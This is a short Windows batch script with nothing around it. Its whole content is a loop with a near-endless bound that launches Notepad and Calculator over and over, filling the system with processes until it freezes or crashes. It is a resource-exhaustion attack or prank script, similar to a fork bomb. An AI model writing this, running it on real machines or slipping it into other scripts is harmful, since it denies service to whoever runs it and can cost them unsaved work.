@echo off
for /l %%x in (1, 1, 100000000000000000) do (
  start notepad.exe
  start calc.exe
)